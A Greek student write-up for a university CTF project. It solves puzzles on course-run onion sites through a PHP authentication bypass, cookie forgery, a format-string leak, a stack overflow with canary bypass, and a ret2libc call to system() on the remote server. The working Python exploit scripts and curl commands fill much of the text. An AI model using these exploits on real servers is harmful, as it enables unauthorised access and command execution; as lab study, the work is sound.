## Computer Privacy CTF Project

![](logo.png)

Ερωτήσεις:

1. Πού βρίσκεται ο Γιώργος;
1. Ποιος έκλεψε τα αρχεία του "Plan X";
1. Πού βρίσκονται τα αρχεία του "Plan X";
1. Ποια είναι τα results του "Plan Y";
1. Ποιο είναι το code του "Plan Z";


#### Ερώτημα 1

Αρχικά πηγαίνοντας στην σελίδα με σύνδεσμο https://2bx6yarg76ryzjdpegl5l76skdlb4vvxwjxpipq4nhz3xnjjh3jo6qyd.onion κάναμε inspect και στα σχόλια είδαμε το λινκ:https://blog.0day.rocks/securing-a-web-hidden-service-89d935ba1c1d, που είναι ενα ποστ για τρόπους προστασίας ιστοσελίδων. Δοκιμάσαμε έτσι να δούμε αν το site είναι ευάλοτο σε κάποια απο τα παραδείγματα που ανεφερε το ποστ. Βρήκαμε έτσι είχαμε access στα __server-info__. Aπό εκεί ανακαλύψαμε το personal site του YS13 στο λινκ https://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion, όπου απαιτούσε σύνδεση. Με λίγο ψάξιμο παρατηρήσαμε πως αν η σελίδα που το site ανακατευθύνει όταν προσπαθήσει κάποιος να συνδεθεί, η __access.php__, αν δοθεί στην μορφή __access.phps__ μπορούμε να δούμε τον κωδικά της.

```php
<?php
// get $secret, $desired and $passwd from this file
// i set $desired to the 48th multiple of 7 that contains a 7 in its decimal representation
require_once "secret.php";

if ((((((((((((((((((intval($_GET['user']) !== $desired) || (strlen($_GET['user'])) != 7))))))))))))))))) {
    die("bad user...\n");
}
if ( isset ($_GET[ 'password' ])) {
   if (strcmp($_GET[ 'password' ], $passwd) != 0 ){
     die("bad pass...\n");
   }
}else {
   die("no pass...\n");
}

// authenticated under YS13's dynamic authentication. greet the user!
echo $secret
?>
```

Αρχικά με λίγο ψάξιμο στο Google βρήκαμε ότι η τιμή του desired ειναι __1337__ και για να παρακάμψουμε τον πρώτο έλεγχο δώσαμε στην μεταβλητή user τιμή __1337%%%__. Στην συνέχεια για να προσπεράσουμε τον έλεγχο του κωδικού γράψαμε στο url __password[]=''__ το οποίο κάνει την strcmp να επιστρέψει 0. Έτσι έγινε echo το secret και πηγαμε στο __/blogposts7589109238__.


Στην σελίδα αυτή αφού πλοηγηθήκαμε λίγο ανακαλύψαμε λίγο και ανακαλύψαμε την σελίδα __post3.html__ που είχε το hint:

`i left the phone backup in the standard secret backup location in fixers that only the winner visitor #834472 will find...`

Στο σημείο αυτο αναρωτιόμενοι τι μπορει να σημαίνει το νούμερο αυτό επιστρέψαμε στο αρχικό site των YS13 Fixers και παρατηρήσαμε ότι ενώ στην αρχή το visitor number δεν είχε τιμή και στο console εμφανιζόταν το warning: `Cookie “Visitor” will be soon rejected because it has the “sameSite” attribute set to “none” or an invalid value, without the “secure” attribute.` όταν κάναμε refresh το visitor number γινόταν 204. Με λίγο ψάξιμο είδαμε ότι ή τιμή του cookie αν γινόταν decrypt με base64 παίρναμε __204:sha256(204)__. Οπότε δοκιμάσαμε να δώσουμε τιμή στο cookie Visitor το __base64(834472:sha256(834472))__ και πήραμε σαν αποτέλεσμα `Congrats user #834472!! Check directory /sekritbackup1843 for latest news...`.

Το __/sekritbackup1843__ περιέχει 2 .gpg αρχεία και το __notes.txt__ με το ακόλουθο περιεχόμενο:

```entry #79:

so i recently found this software called gpg which is capable of encrypting my
files, and i came up with a very smart and easy-to-remember way to finally keep
my data secret:

First of all, I generate a random passphrase using the SHA256 hash algorithm,
and then I save it on disk in hex as "passphrase.key". In particular, here is
how to generate the key:

    key = SHA256(<current date in RFC3339 format> + " " + <secret string>)

    e.g. so if the secret string is "cement" then the key would be:
             key = SHA256("2020-05-18 cement") = cadf84c9706ff4866f8af17d3c0e3503da44aea21c2580bd6452f7a1b8b48ed2

Then I use the gpg software to encrypt my files using the passphrase.key file:

    $ gpg --symmetric --passphrase-file passphrase.key --batch plaintext.txt

I then delete all the unencrypted files and the key files and just leave the
encrypted files behind.

XXX don't forget to delete this file, the key and the script before crossing borders
XXX ropsten 0xdcf1bfb1207e9b22c77de191570d46617fe4cdf4dbc195ade273485dddc16783
```
οπότε για να κάνουμε decrypt τα .gpg αρχεία έπρεπε να βρούμε μία ημερομηνία και ένα secret string.

Για να βρούμε το secret string πήγαμε στην σελίδα https://ropsten.etherscan.io/ και ψάχνοντας το hash που είχε δοθεί παραπάνω βρήκαμε ένα transaction με input data __bigtent__. Αυτό είναι και το secret string μας.

Για να βρούμε την ημερομηνία φτιάξαμε ένα script που δοκιμάζει όλες τις ημερομηνίες και κατευθείαν δοκιμάζει και το key για να κάνει decrypt τά gpg αρχία και μας επιστρέφει τα περιεχόμενά τους στο res.txt.
decrypt.sh
```bash
#!/bin/bash

DATE=2021-01-01
X=" "
for i in {0..366}
do
   NEXT_DATE=$(date +%Y-%m-%d -d "$DATE + $i day")
   X=$(printf "$NEXT_DATE bigtent"| sha256sum)   
   (echo ${X::-3} | gpg --batch --passphrase-fd 0 --armor --decrypt signal.log.gpg) 1>> res.txt 2>>err.txt
done
```
To αρχείο signal πριέχει τις λέξεις commit και git καθώς και ένα sha1 κωδικό, που μας έκανε να καταλάβουμε ότι επρεπε να βρούμε ένα repository. Στην συνέχεια κοιτάξαμετο firefox.log που περιέχει το https://en.wikipedia.org/wiki/The_Conversation εκατομμύρια φορές. Στο σημείο αυτό σκεφτήκαμε ότι μπορεί να υπάρχει κάτι κρυμμένο μέσα σε όλα αυτά τα λινκ και αφαιρόντας τα όλα βρήκαμε το λινκ https://github.com/asn-d6/tor. Εκεί ψάξαμε το hash του signal και βρήκαμε το ακόλουθο commit στο repo.
```
/**
 * Hey Maria... So I went to the Rivest club again yesterday and met a guy who
 * sold me tickets that will take me out of this crazy city. I hope that in a
 * few days we will be together again. Find me at:
 *
 *     http://aqwlvm4ms72zriryeunpo3uk7myqjvatba4ikl3wy6etdrrblbezlfqd.onion/x||y||x||y.txt
 *
 *          where || means concatenation
 *
 ******
 *
 * N = 127670779
 * e = 7
 *
 * E(x) = 122880244
 * E(y) = 27613890
 */
 ```
 Βλέποντας το Ν και e καταλάβαμε ότι επρεπε να αποκρυπτογραφίσουμε τα E(x), E(y) με RSA. Αρχικά έπρεπε να βρούμε το d που το βρήκαμε με το ακόλουθο scrypt:
 ```python
 import math

flag=0
for i in range(1,500000000):
  if (7*i)%lcm(7962,16032)==1:
    print(i)
    flag=1
    break
if flag==0:
  print("Not Found")
  ```
  και έπειτα χρησιμοποιώντας την σελίδα https://www.dcode.fr/modular-exponentiation κάναμε decrypt και βρήκαμε __x=306__ και __y=2725__.
  
  Tέλος πηγαίνοντας στην σελίδα http://aqwlvm4ms72zriryeunpo3uk7myqjvatba4ikl3wy6etdrrblbezlfqd.onion/30637353063735.txt βρήκαμε την τοποθεσία του Γιώργου στο __Gilman's Point on the Kilimanjaro__.


#### Ερώτημα 2

Στην σελίδα http://flffeyo7q6zllfse2sgwh7i5b5apn73g6upedyihqvaarhq5wrkkn7ad.onion/blogposts7589109238/blogposts/diary2.html τα εξής

```
I know you all want to learn about my hobbies and interests!

Due to the sensitive nature of my affiliation with the "Plan X" group I'm not just writing this stuff out here for all the creeps to see it.

Fortunately, a valued customer with a cool black hat recently gave me a secure interface for storing sensitive information. He said that it's even open source (github:chatziko/pico) and ultra secure.

The secure Plan X server is up: zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion! I can finally sleep feeling safe... Please come by the store (when we open) and ask me for the password first.

socat + onions = perfect recipe
```

Πηγαίνοτας στην σελίδα http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion είδαμε ότι ζητάει κωδικό.

Έτσι πήγαμε στο repo github:chatziko/pico καταβάσαμε τα αρχεία, κάναμε τις απαραίτητες αλλαγές και έπειτα κάναμε make. Το πρώτο πράγμα που είδαμε ήταν ένα warning
```
main.c:135:5: warning: format not a string literal and no format arguments [-Wformat-security]
     printf(auth_username);
```
Οπότε καταλάβαμε ότι η printf αυτή δεν έχει κάποιο τύπο για την εκτύπωση. Έτσι δοκιμάζοντας διάφορα input βάλαμε 0 με την μορφή _%0x5__ και είδαμε ότι παίρνουμε σκουπίδια. Έτσι βάζοντας 6*%0x5 ακολουοθόμενα από ένα _%s_ πήραμε τον κωδικό του admin `admin:e5614e27f3c21283ad532a1d23b9e29d`.Ψάχνοντας τον κώδικα του σαιτ καταλάβαμε ότι ο κωδικός στο σαιτ ήταν encrypted με md5 και χρησιμοποιόνταςς ένα online tool τον κάναμε decrypt βρίσκοντας __bob's your uncle__.

Τέλος συνδεθήκαμε στο σαιτ με τον κωδικό του admin και είδαμε το μήνυμα 
```
Hacked by 5l0ppy 8uff00n5

Your security sucks ~~ Send me 10 BTC to get the pwd for your files
```

Επομένως τα αρχεία του "Plan X" τα έκλεψαν οι __5l0ppy 8uff00n5__


#### Ερώτημα 3

Στο ερώτημα αυτό έπρεπε κάπως να παρακάμψουμε τον κωδικό της σελίδας http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html, αφού είχαμε κάνει loggin.

Αρχικά ελέγχοντας τα αρχεία του server είδαμε ότι ήταν δυνατό να γίνει buffer overflow στην __strcpy(post_data, payload)__ της post_param, καθώς εκεί γινόταν ο έλγχος του κωδικού. Παρόλο που το μέγεθος του post_data είναι payload_size+1 αυτό δεν μας πείραξε αφού δίνοντας __Content-Length__ όταν κάναμε κάποιο request μπορούσαμε να βάλουμε ότι μεγεθος θέλαμε. Εμείς για ευκολία επιλέξαμε 0. Έπειτα χρησιμοποιώντας το gdb είδαμε την μορφή του stack της post_param.

```
0xffffd170:     0x56557368      0x5655749e      0xf7ba093b      0x56556738
0xffffd180:     0xf7fcf000      0x00000000      0xffffd1b8      0x5655738c
0xffffd190:     0x5655c160      0x00000064      0x5655c160      0x565562d7
0xffffd1a0:     0x0000000a      0xffffd170      0x00000000      0x15962c00
0xffffd1b0:     0x56558f10      0xf7fcf000      0xffffd258      0x56556123
```
Η τιμή του $ebp είναι 0xffffd258, του return address 0x56556123 και του canary 0x15962c00. Για να παρακάμψουμε το loggin έπρεπε να θέσουμε το return address της post_param ίσο με την διεύθυνση του address όπου καλείται η serve_ultimate στην route, δηλαδή να προσπεράσουμε το if(allowed).

Για να καταφέρουμε το attack έπρεπε να γεμίσουμε τον buffer μέχρι πριν το canary, να κρατήσουμε το canary σταθερό και να βάλουμε στο $ebp + 4 την διευθυνση του `` call   0x5655689d <serve_ultimate>`` από την route. Στην αρχή έπρεπε να βρούμε την διεύθυνση αυτή στον remote server. Για να το κάνουμε αυτό βρήκαμε την απόσταση ανάμεσα στο return address που επιστρέφει η vulnerable printf, βάζοντας σαν όνομα %x 31 φορές, με την διεύθυνση της κλήσης την serve_ultimate στην route. Στην συνέχεια, χρησιμοποιώντας την printf του loggin και βάζοντας σαν όνομα %x*31(το 31 το βρήκαμε με δοκιμές στο local server), όπως και στο local, πήραμε το return address του remote server και σε αυτό προσθέσαμε τον νούμερο που υπολογίσαμε. Είχαμε έτσι την διεύθυνση που ΄θέλαμε. Έπειτα έπρεπε να κρατήσουμε το canary ίδιο για να μην έχουμε __stack-smash__. Έδω προέκυψε το πρόβλημα ότι το canary περιέχει \x00 και η strcpy σταματούσε να γράφει μετά από αυτό. Για να το παρακάμψουμε αυτό παρατηρήσαμε ότι η for μετά την strcpy αντικαθοστούσε του χαρακτήρες __&__ και __=__ με __\0__. Έτσι στο canary βάλαμε αντί για \x00, \x26(δηλαδή &). Το πρόβλημα τώρα ήταν πώς θα κάνουμε την for να αντικαθαστίσει όντως το \x26, αφου παίρναμε segmentation fault. Για να το κάνουμε αυτό παρατηρήσαμε ότι αν ΄βαλουμε στην διεύθυνση(στο παραπάνω παραδειγμα) 0xffffd1ac την διεύθυνση του canary η for δουλεύει κανονικά. Για να είμαστε σίγουροι αποφασίσαμε να γεμίσουμε όλη την μνήμη πριν από το canary με την διεύθυνσή του.
Την τιμή του canary στον remote server την παίρνουμε και αυτήν από την printf, όπως και την τιμή του $ebp που μας βοήθησε να υπολογίσουμε την διεύθυνση του canary στον remote server. 

Για να πραγματοποιήσουμε το attack φτίαξαμε το ακόλουθο script.

```python
import requests, sys, os
from requests import Request, Session,exceptions

heads ={    #headers used for request
'Authorization': 'Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==',
#'Authorization': 'Basic YWRtaW46cGFzcw==',
'Connection': 'keep-alive',
'Upgrade-Insecure-Requests': '1',
}

split = sys.argv[1]     #get input

last40 = split[-40:]    #we keep only the 40 last characters

# we calculate the correct return address. The return address is the address where route calls serve_ultimate
returnaddress = str(hex(int(last40[32:40],16) + 325))       

# address of canary. we use this address so that the for loop in post_param replaces the \x26 we put in the canary with \x00
temp =  int(last40[24:32],16) - 172
canaryaddress = str(hex(temp))      

#we replace the \x00 in the canary with \x26 so that stcpy doesnt stop
canary = str(hex(int(last40[0:8],16) + 38))     

data = bytes.fromhex(canaryaddress[2:])[::-1]
for i in range(0,14):
    data += bytes.fromhex(canaryaddress[2:])[::-1]  #we fill the buffer with the canary address, just to be sure, up untill we reach the canary

data += bytes.fromhex(canary[2:])[::-1]     #canary
data += bytes.fromhex(str(hex(int(last40[8:16],16)))[2:])[::-1] # 3 random values, doesn't really matter
data += bytes.fromhex(str(hex(int(last40[16:24],16)))[2:])[::-1]
data += bytes.fromhex(str(hex(int(last40[24:32],16)))[2:])[::-1]
data += bytes.fromhex(returnaddress[2:])[::-1]          #return address of serve_ultimate call in route

print(data)

try:        #perform request
    s = Session()
    response = Request('POST','http://127.0.0.1:8000/ultimate.html', headers=heads, data=data)
    prep = response.prepare()
    prep.headers['Content-Length'] = 0  #we uses this to set content length to 0 so that we can overflow the buffer
    resp = s.send(prep)
   
    status_code = resp.status_code
    print("Status Code =" + str(status_code))   #Status code
    print("Response = " + resp.text)            #Response text
except exceptions.RequestException as excep:
    print(excep)
```

Στο script αυτό αρχικά δίνουμε σαν input το αποτέλεσμα που πήραμε από την printf, φτιάχνουμε τα data, που έχουν την μορφή ``canary's address*15 + canary+ 3*values + address of call serve_ultime in route``. Τα 3 values είναι οι 2 τιμές ανάμεσα στο canary και τον $ebp και ο $ebp που δεν μας νοιάζει τι τιμές θα έχουν.

Για να τρέξει το request είχαμε πρώτα τρέξει 
```socat TCP4-LISTEN:8000,bind=127.0.0.1,fork SOCKS4A:localhost:zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion:80,socksport=9050```
. Για το socat εμπνευστήκαμε από το μήνυμα στην αρχή του ερωτήματος 2 ``socat + onions = perfect recipe``.
Επίσης για να πάρουμε αποτελέσματα από την printf τρέχαμε
```curl --socks5-hostname localhost:9050 'zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html' -i --user %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: --data-raw 'ok' -H 'Content-Length: 0'```

Τρέχοντας το script πήραμε το αποτέλεσμα
```
Thanks for the coins, I knew I can do business with you.

Your ssh access to the server should be restored, you can find your
files under /var/backup/ (see 'backup.log' for a list).

To avoid losing your files again, hire us!
5l0ppy 8uff00n5 can help you fix all your security issues.
Use the code tmmt8pN_lj4 to get 20% off our usual rates!
```
Άρα τα αρχεία του Plan X βρίσκονται στο __/var/backup/__

#### Ερώτημα 4

Στο ερώτημα αυτό έπρεπε να δούμε τα περιεχόμενα του __/var/backup/backup.log__. Για να το επιτύχουμε αυτό επιλέξαμε να χρησιμοποιήσουμε την συνάρτηση send_file με όρισμα το /var/backup/backup.log. Το attack βασίστηκε σε αυτό που κάναμε στο 3 με μερικές αλλαγές.

Αρχικά το return address έπρεπε να μας επιστρέφει στην send_file. Για να γίνει αυτό βρήκαμε τοπικά την απόσταση του return address που επιστρέφει η vulnerable printf και το αφαιρέσαμε από την τοπική διεύθυνση της send_file για να βρούμε το offset τους. Το offset αυτό το προσθέτουμε στο αντίστοιχο remote return address για να βρούμε την διεύθυνση της send_file στο remote server. Επιπλέον τοποθετήσαμε το string /var/backup/backup.log στην αρχή του buffer και θέσαμε της μεταβλητές μνήμης που βρίσκονται στο return address+4 και return address+8(δηλαδή της παραμέτρους της συνάρτησης) να δείχνουν στην διεύθυνση της αρχής του buffer όπου ξεκινάει το string. Επίσης στο τέλος του string τοποθετήσαμε 2 & για να δείξουν ότι εκεί τελειώνει(τα & μετατρέπονται σε \0 στην post_param).

To script μας __call_send_file.py_ που δημιουργεί το attack string που έχει μορφή ``"/var/backup/backup.log" + "&&" + (address of canary)*10 + canary + 3*values + address of send_file + (address of "/var/backup/backup.log")*2``:
```python
import requests, sys, os
from requests import Request, Session,exceptions


split = sys.argv[1]

last40 = split[-40:]

returnaddress = str(hex(int(last40[32:40],16) + 1625))

temp =  int(last40[24:32],16) - 232
canaryaddress = str(hex(temp))

canary = str(hex(int(last40[0:8],16) + 38))

#address of char*
single_pointer= str(hex(int(last40[24:32],16) - 232))

data = b"/var/backup/backup.log"
data += b"&&"
data += bytes.fromhex(canaryaddress[2:])[::-1]

for i in range(0,9):
    data += bytes.fromhex(canaryaddress[2:])[::-1]

data += bytes.fromhex(canary[2:])[::-1]
data += bytes.fromhex(str(hex(int(last40[8:16],16)))[2:])[::-1]
data += bytes.fromhex(str(hex(int(last40[16:24],16)))[2:])[::-1]
data += bytes.fromhex(str(hex(int(last40[24:32],16)))[2:])[::-1]
data += bytes.fromhex(returnaddress[2:])[::-1]
data += bytes.fromhex(single_pointer[2:])[::-1]
data += bytes.fromhex(single_pointer[2:])[::-1]

print(data) 
```
To αποτέλεσμα του script το δίναμε σαν input στο παρακάτω bash script για να τροποποιήσει την έξοδο.
final.sh
```
#!/bin/sh

i=$(python3 call_send_file.py $1)
i=${i:2}
i=${i%?}
echo -en $i 
```
Το αποτέλεσμα του δεύτερου script το χρησιμοποιήσαμε για κάνουμε το ακόλουθο curl.
``bash final.sh 56d4b3103e565a344a0056d3b373565a61800056d4b3103f0156d4b31056d4b34e56d4b34f3e00000000f7aedd49aa0bf900f7c55d80565a5f10ffceb2f8565a3015 | curl --trace -  --socks5-hostname localhost:9050 'zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html' --http0.9  -X POST -i -H 'Authorization: Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ=='  -H 'Connection: keep-alive'  --data-binary @- -H 'Content-Length: 0'``
Aυτό δουλεψε και μας επέστρεψε το ακόλουθο
```
 backing up...
index.html
z.log
2021_project1_grades.pdf
bob.sql
playlist
```
Ανοίξαμε τα αρχεία αυτά με τον ίδιο τρόπο που ανοίξαμε και το backup.log αλλάζοντας απλά το string σε αυτό που επιθυμούσαμε. Η απάντηση βρισκόταν στο z.log.
```
Computing, approximate answer: 41.998427123123
...



Plan Z: troll humans who ask stupid questions (real fun).
I told them I need 7.5 million years to compute this XD

In the meanwhile I'm travelling through time trolling humans of the past.
Currently playing this clever dude using primitive hardware, he's good but the
next move is crushing...

1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7

PS. To reach me in the past use the code: "<next move><public IP of this machine>"
```

Επομένως τα results του Plan Y είναι __41.998427123123__.

#### Ερώτημα 5

Διαβάζοντας το κείμενο του z.log βλέπουμε ότι για να απαντήσουμε στο ερώτημα πρέπει να βρούμε το "next move" και το "public IP of this machine".
 
Αρχικά για να βρούμε το "next_move" ψάξαμε στο Google τα  1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7 και βρήκαμε ότι είναι η ακολουθία κινήσεων του game 6 Deep Blue–Kasparov. Η επόμενη κίνηση ήταν 19.c4 1–0. Άρα το "next_move" είναι c4.

  Για να βρούμε το "public IP of this machine" έπρεπε να καλέσουμε κάποια συνάρτηση που μας λέει το IP στον remote server. Επιλέξαμε την curl checkip.dyndns.org. Για να την καλέσουμε έπρεπε να καλέσουμε την συνάρτηση system στον remote server με όρισμα αυτήν.
  
  Αρχικά έπρεπε να βρούμε την διεύθυνση της system στον remote server. Αρχικά δοκιμάσαμε να χρησιμοποιήσουμε το return address ή τον ebp που παίρνουμε από την printf, όμως δεν δούλεψαν. Παρατηρήσαμε ότι τοπικά η διεύθυνση της system ξεκινούσε πάντα από f7. Επιπλέον προσέξαμε ότι τόσο τοπικά όσο και στον remote server η οκτάδα πριν από το canary που εκτυπώνει η printf ξεκινάει πάντα και αυτή από f7. Έτσι για να υπολογίσουμε την διεύθυνση πήραμε την τιμή που ξεκινάει από f7 στον remote server και από αυτήν αφαιρέσαμε την αντίστοιχη τιμή από τον τοπικό server. Το αποτέλεσμα που βρήκαμε το προσθέσαμε στην τοπική διεύθυνση της system και έτσι βρήκαμε την remote. Είχαμε δοκιμάσει προηγουμένως με μία άλλη από τις διευθύνσεις που ξεκινάν από f7 και δεν δούλευε, τελικά αφού δούλεψε όλα έγιναν πιο ξεκάθαρα: η μία διεύθυνση που έδειχνε σε μία από τις συναρτήσεις της stdlib που χρησιμοποιούνταν ήταν σε διαφορετικό fragment στη μνήμη από το άλλο, συνεπώς βρίσκοντας το fragment όπου υπήρχε η system βρήκαμε τη λύση.
  
  Επιπλέον για να διαβάζει σωστά την παράμετρο(δηλαδή το curl checkip.dyndns.org) έπρεπε να την τοποθετήσουμε στην διεύθυνση return address+12 και να θέσαμε της μεταβλητές μνήμης που βρίσκονται στο return address+4 και return address+8 να δείχνουν σε αυτή.
  
Το script μας για το ερώτημα αυτο. find_ip.py που παράγει το attack string με μορφή ``(address of canary)*15 + canary + 3*values + address of system + (address of system +12)*2 + "curl checkip.dyndns.org" + "&"``.
  
```python
import requests, sys, os
from requests import Request, Session,exceptions

split = sys.argv[1]

last40 = split[-40:]
trial= split[-48:]

returnaddress = str(hex(int(last40[32:40],16) + 1625))

temp =  int(last40[24:32],16) - 172
canaryaddress = str(hex(temp))

canary = str(hex(int(last40[0:8],16) + 38))

#address of remote system
sys_diff = int(trial[0:8],16) - int("f7babd49",16)
remote_sys_addr= str(hex(int("f7b782e0",16) + sys_diff))

doub_pointer= str(hex(int(last40[24:32],16) - 148))

single_pointer= str(hex(int(last40[24:32],16) - 144))

data = bytes.fromhex(canaryaddress[2:])[::-1]

for i in range(0,14):
    data += bytes.fromhex(canaryaddress[2:])[::-1]

data += bytes.fromhex(canary[2:])[::-1]
data += bytes.fromhex(str(hex(int(last40[8:16],16)))[2:])[::-1]
data += bytes.fromhex(str(hex(int(last40[16:24],16)))[2:])[::-1]
data += bytes.fromhex(str(hex(int(last40[24:32],16)))[2:])[::-1]
data += bytes.fromhex(remote_sys_addr[2:])[::-1]

data += bytes.fromhex(single_pointer[2:])[::-1]
data += bytes.fromhex(single_pointer[2:])[::-1]

data += b"curl checkip.dyndns.org"
data += b"&"

print(data)
```
To script αυτό το χρησιμοποιήσαμε σε συνδιασμό με το final.sh και στην συνέχεια κάναμε το ίδιο curl με αυτό του ερωτήματος 4. Η επίθεση δούλεψε και το αποτέλεσμα που πήραμε είναι ```54.159.81.179```.
Επομένως το code του Plan Z είναι ``c454.159.81.179``.

### Τελικό script

Το script __run.sh__ δέχεται σαν όρισμα το αποτέλεσμα της vulnerable printf και ένα νούμερο που είναι 3,4 ή 5 για να τρέξει την αντίστοιχη επίθεση. Στο script αυτό αλλάξαμε λίγο το python script του δεύτερου ερωτήματος για να τρέχει με curl.

Το αποτέλεσμα της printf δίνεται από ``curl --socks5-hostname localhost:9050 'zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/ultimate.html' -i --user %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: --data-raw 'ok' -H 'Content-Length: 0'``

### Σχόλια:

Tα test των επιθέσεων και οι επιθέσεις έγιναν σε WSL με Ubuntu 18.04. Λογικά θα δουλεύουν και σε 20.04. Αν προκύψει οποιοδήποτε πρόβλημα μπορείτε να επικοινωνήσετε μαζί μας στα email: sdi1700177@di.uoa.gr και sdi1700156@di.uoa.gr.


Στο python script που δημιουργεί το string της επίθεσης για το ερώτημα 5 χρησιμοποιούμε 2 σταθερές διευθύνσεις(f7babd49 και f7b782e0). Η πρώτη είναι η οκτάδα που παίρνουμε απο την printf, τοπικά, δηλαδή η πρώτη οκτάδα δεξία του canary και η δεύτερη είναι η τοπική διεύθυνση της system που προκύπτει από το ίδιο "τρέξιμο" που προέκυψε και η άλλη οκτάδα.  Για να το τεστάρετε μπορεί να χρειαστεί να το τρέξετε και να βάλετε τις δικές σας τιμές. 

Για τα ερωτήματα 4 και 5 μπορεί να χρειαστεί να προσθέσετε το flag --http0.9 στα curl στο run.sh. 
